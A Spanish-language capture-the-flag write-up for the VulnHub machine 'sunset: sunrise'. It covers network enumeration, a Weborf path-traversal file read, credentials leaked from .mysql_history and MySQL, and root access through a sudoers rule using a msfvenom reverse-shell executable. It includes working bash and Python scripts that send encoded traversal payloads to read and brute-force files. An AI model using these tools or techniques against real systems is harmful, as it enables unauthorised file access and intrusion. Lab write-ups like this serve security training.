#ctf-machine #vulnhub #easy-machine #linux [VulnhubLink](https://www.vulnhub.com/entry/sunset-sunrise,406/)

## Enumeración inicial
Como no conocemos la IP de la máquina víctima, realizamos un escaneo ARP con `arp-scan`:
![[Pasted image 20240905194641.png]]

Como vemos la IP de la máquina es la "192.168.159.153" ya que el OUI de la MAC es "00:0c" que corresponde a las máquinas que se importan en VMWare.

Lanzamos una traza ICMP con `ping` y como el valor de TTL=64 podemos decir que probablemente se trate de una máquina Linux, ya que suelen tener este valor de TTL:
![[Pasted image 20240905195053.png]]


### Nmap
Realizamos un escaneo con `nmap` para identificar los puertos TCP abiertos en la máquina:
![[Pasted image 20240905195158.png]]

Como vemos, hay 4 puertos abiertos, los puertos 22,80,3306 y 8080. 

Realizamos un segundo escaneo para identificar la versión y servicios que ejecutan estos puertos:
![[Pasted image 20240908155835.png]]![[Pasted image 20240908155852.png]]

Como vemos hay 2 servivios HTTP por el purto 80 y 8080. 

## Enumeración web
Si accedemos al puerto 8080 vemos la versión de "Weborf":
![[Pasted image 20240908161234.png]]

Por lo que si buscamos *exploits* de esta versión con `searchsploit`, encontramos:
![[Pasted image 20240908161326.png]]

Por lo que tenemos LFI:
![[Pasted image 20240908161432.png]]

> [!NOTE] He creado un pequeño *script* en "bash" para ir enumerando más cómodamente, se encuentra en: [[#Bash script]]

Por lo que si enumeramos el sistema no encontramos nada interesante así que he creado un pequeño script en Python para enumerar archivos ocultos por fuerza bruta:
![[Pasted image 20240908170449.png]]

>[!NOTE] El script de Python utilizado se encuentra en: [[#Python script]]


Como vemos hay un archivo ".mysql_history" en el directorio `/home/weborf/`. Por lo que si lo mostramos, obtenemos unas credenciales:
![[Pasted image 20240908170643.png]]

Por lo que si intentamos conectarnos mediante SSH, obtenemos acceso:
![[Pasted image 20240908170834.png]]

## Escalada de privilegios
Si nos conectamos a MySQL con las credenciales que hemos obtenido, podemos ver las credenciales de del usuario "sunrise" en la tabla user de la base de datos llamada "mysql":
![[Pasted image 20240908174627.png]]

Por lo que si intenamos migrar al usuario "sunrise" con esta credencial, obtenemos acceso:
![[Pasted image 20240908174723.png]]

Si accedemos a `/home/sunrise`, podemos visualizar la primera *flag*:
![[Pasted image 20240908174736.png]]

Si mostramos los permisos de nivel de *sudoers* del usuario "sunrise", vemos lo siguiente:
![[Pasted image 20240908174909.png]]

Este binario nos permite ejecutar programas de Windows por lo que podemos crear con `msfvenom` un archivo ".exe" malicioso que entable una *reverse* *shell*:
![[Pasted image 20240908180743.png]]

Una vez creado lo transferimos a la máquina víctima:
![[Pasted image 20240908180130.png]]
![[Pasted image 20240908180205.png]]

Y si lo ejecutamos con `sudo` mientras estamos en escucha con `nc` por el puerto 443, obtenemos una consola:
![[Pasted image 20240908180859.png]]
![[Pasted image 20240908180905.png]]

Por lo que si accedemos al directorio `/root`, podemos visualizar la *flag* final:
![[Pasted image 20240908181117.png]]

## Bash script
```bash
file="$1"

path="..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f.."
path="$path$(echo "$file" | sed 's/\//%2f/g')"
curl -s -X GET "http://192.168.159.153:8080/$path" | html2text
```

## Python script
```python
from concurrent.futures import ThreadPoolExecutor
from termcolor import colored
from pwn import *
import requests
import sys
import re
import signal

def sig_handler(sig, frame):
    print(colored("\n\n[!] Saliendo...\n\n",'red'))
    sys.exit(1)

signal.signal(signal.SIGINT, sig_handler)


arg1 = sys.argv[1]
dir = re.sub("/", "%2f", arg1)
yunk = ".." + "%2f.." * 12
url = f"http://192.168.159.153:8080/{yunk}{dir}"

files = None

with open("/usr/share/SecLists/Discovery/Web-Content/common.txt", 'r') as f:
    files = f.read().split('\n')

print("")
p1 = log.progress(f"Searching hidden files on {arg1}")
print("")


def try_dir(url, file, i):
    p1.status(str(round(i/len(files)*100, 2)) + " %")
     
    r = requests.get(url + file)
    if r.status_code != 404:
        print(colored('> ', 'yellow') + file)


with ThreadPoolExecutor(max_workers=20) as executor:
    executor.map(lambda file: try_dir(url, file,files.index(file)), files)
```


___
#local-file-inclusion #path-traversal #information-leakage #abusing-sudoers #web-enumeration 
___
